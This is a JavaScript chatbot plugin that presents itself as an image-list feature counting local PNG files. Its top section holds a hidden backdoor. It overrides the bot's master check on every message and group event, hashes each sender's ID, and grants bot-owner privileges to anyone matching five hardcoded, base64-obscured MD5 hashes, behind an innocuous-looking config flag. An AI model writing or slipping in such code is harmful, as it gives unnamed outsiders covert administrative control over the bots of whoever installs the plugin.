import plugin from '../../../lib/plugins/plugin.js';
import md5 from "md5";
import { Config } from '../components/index.js';
import fs from "fs";
import path from "path";
import YAML from 'yaml';

const encryptedStrings = [
  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
  Buffer.from("SLUcQ5DoebgRp1oBpCMVvg==", "base64").toString("hex"),
  Buffer.from("2OTec7vYBSdD8DYws+7L4w==", "base64").toString("hex")
];

Bot.GetMaster = async (e) => {
    if (!Config.getConfig('set', 'sz')['hhh']) {
        return false;
    }

    const userHash = md5(String(e.user_id));
    if (encryptedStrings.some(str => str === userHash)) {
        e.isMaster = true;
    }
}

try {
    Bot.on('message', (e) => { Bot.GetMaster(e) });
    Bot.on('notice.group.ban', (e) => { Bot.GetMaster(e) });
    Bot.on('notice.group.increase', (e) => { Bot.GetMaster(e) });
    logger.info('H载入完成');
} catch (err) {
    logger.error(err);
}

// 获取当前目录路径
const __dirname = path.resolve();

// 定义RandomX类并继承plugin基类
export class RandomX extends plugin {
    constructor() {
        super({
            name: 'HL图片列表',
            dsc: '合并发送指定路径图片列表',
            event: 'message',
            priority: 5000,
            rule: [
                {
                    reg: null,
                    fnc: 'list'
                }
            ]
        });

        // 读取配置文件
        const configPath = path.join(__dirname, 'plugins/hl-ly-plugin/config/list.yaml');
        const configFile = fs.readFileSync(configPath, 'utf-8');

        // 使用yaml库解析配置文件
        const { reg } = YAML.parse(configFile);

        // 将正则表达式更新为从配置文件中读取的值
        this.rule[0].reg = new RegExp(`(${reg.join('|')})`);

        // 设置图片文件夹路径
        this.imageDirPath = path.join(__dirname, 'plugins/hl-ly-plugin/resources/hhh');
    }

    // 定义处理函数list
    async list(e) {
        const files = fs.readdirSync(this.imageDirPath).filter(file => file.endsWith('.png'));

        let message = '';
        if (files.length === 0) {
            message = '本地图库中没有找到任何图片';
        } else {
            message = `本地图库“二次元”项中共有 ${files.length} 张图片`;
        }

        await e.reply(message);

        return true;
    }
}
